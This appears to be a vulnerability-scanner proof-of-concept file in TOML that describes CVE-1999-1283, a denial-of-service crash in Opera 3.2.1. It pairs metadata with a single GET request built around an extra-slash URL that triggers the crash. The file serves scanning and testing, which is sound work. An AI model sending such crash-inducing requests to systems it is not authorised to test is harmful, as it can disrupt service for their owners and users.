[info]
author = "AVE"
description = "Opera 3.2.1 crashes when processing a URL with an extra slash in http:// tag (http:///), causing a denial of service"
id = "POC-AVE-1999-1451"
name = "CVE-1999-1283 PoC"
severity = "medium"
tags = [
    "cve-1999-1283",
    "ave-1999-1451",
]
vuln_id = [
    "CVE-1999-1283",
    "AVE-1999-1451",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
